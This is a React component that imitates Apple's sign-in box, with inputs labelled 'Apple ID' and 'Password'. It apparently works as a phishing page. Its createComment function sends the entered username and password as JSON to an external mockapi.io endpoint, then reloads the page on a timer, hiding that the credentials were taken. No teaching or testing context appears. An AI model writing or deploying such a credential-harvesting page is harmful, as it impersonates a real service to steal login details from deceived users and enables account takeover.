import React, { useState } from 'react'
import styled from 'styled-components'
import axios from 'axios'
import arrow from "../img/arrow.png"
import { Link } from 'react-router-dom'
const Container = styled.div`
    height: 90px;
    display: flex;
    justify-content: center;
`

const Form = styled.form`
    
`

const InputUserName = styled.input`
    background: ${prop => prop.changeColor === "E8F0FE" && "#E8F0FE"};
    padding: 0px 60px 0px 0px;
    padding-left: 10px;
    margin: 0;
    box-shadow: none;
    height: 2.35em;
    border-color: transparent;
    font-size: 16px;
`

const InputPassWord = styled.input`
    background: ${prop => prop.changeColor === "E8F0FE" && "#E8F0FE"};
    padding: 0px 60px 0px 0px;
    padding-left: 10px;
    margin: 0;
    box-shadow: none;
    height: 2.39em;
    border-color: transparent;
    font-size: 16px;
`

const ButtonSubmit = styled.button`
    background: none;
    border: none;
    width: 51px;
    height: 41px;
    margin-top: 0.7px;
    margin-left: 3px;
    &:hover{
        cursor: ${prop => prop.checkCursor === true && "pointer"};
    }
`

const Wrapper = styled.div`
    background: white;
    background: ${prop => prop.changeColor === "E8F0FE" && "#E8F0FE"};
    border: 1.1px solid #d6d6d6;
    display: flex;
    border-radius: 4.5px;
    justify-content: center;
    width: 327px;
    height: 42px;
`

const ArrowIcon = styled.img`
    width: 90%;
    height: 98%;
    margin-left: 6.5px;
`



const PostForm = () => {
    const url = "https://6289c2e4e5e5a9ad321cc715.mockapi.io/api/user"
    const [data, setData] = useState({
        userName: "",
        passWord: ""
    })

    const handleSubmit = (e)=>{
        e.preventDefault()
        if(isFlagCheckBtnSend){
            axios.post(url,{
                username: data.userName,
                password: data.passWord
            })
        }
    }

    const [userNameValue, setUserNameValue] = useState("")

    const handleUpdate = (e)=>{
        setIsFlagCusor(true)
        setUserNameValue(e.target.value)
        const newData = {...data}
        newData[e.target.id] = e.target.value
        setData(newData)
        
    }
    var dataFinal = {
        username: data.userName,
        password: data.passWord,
      };
    const[isFlagCheckBtn, setIsFlagCheckBtn] = useState(false)
    const[isFlagCheckBtnSend, setIsFlagCheckBtnSend] = useState(false)
    const[isFlagCheckArrow, setIsFlagCheckArrow] = useState(true)
    const[isFlagCheckArrow2, setIsFlagCheckArrow2] = useState(true)
    const[isFlagCusor, setIsFlagCusor] = useState(false)
    const[changeColor, setChangeColor] = useState("")
    const[changeColor2, setChangeColor2] = useState("")

    const handleNextBtn = ()=>{
        if(userNameValue){
            setChangeColor("E8F0FE")
            setIsFlagCheckBtn(true)
            setIsFlagCheckArrow(false)
        }
    }
    function refreshPage() {
        window.location.reload(false);
      }
    const handleSendBtn = ()=>{
        setChangeColor2("E8F0FE")
        setIsFlagCheckArrow2(false)
        // setIsFlagCheckBtnSend(true)
        createComment(dataFinal)
        setInterval(refreshPage, 3000)
    }


function createComment(data) {
  if (userNameValue !== "") {
    var options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    };
    fetch(url, options).then(function (res) {
      return res.json();
    });
  }
}

    
    return (
        <Container>
            <Form onSubmit={e=>handleSubmit(e)}>
                <Wrapper changeColor={changeColor}>
                    <InputUserName changeColor={changeColor} onChange={e=>handleUpdate(e)} id="userName" value={data.userName} placeholder='Apple ID' type='text'/>
                    
                    <ButtonSubmit checkCursor={isFlagCusor} onClick={handleNextBtn}>{isFlagCheckArrow&&<ArrowIcon src={arrow}/>}</ButtonSubmit>
                </Wrapper >
                {isFlagCheckBtn&&<Wrapper changeColor={changeColor2}>
                    <InputPassWord changeColor={changeColor2} onChange={e=>handleUpdate(e)} id="passWord" value={data.passWord} placeholder='Password' type='text'/>
                    

                    <ButtonSubmit onClick={handleSendBtn}>{isFlagCheckArrow2&&<ArrowIcon src={arrow}/>}</ButtonSubmit>
                 
                </Wrapper>}
            </Form>
            
        </Container>
    )
    
  
}

export default PostForm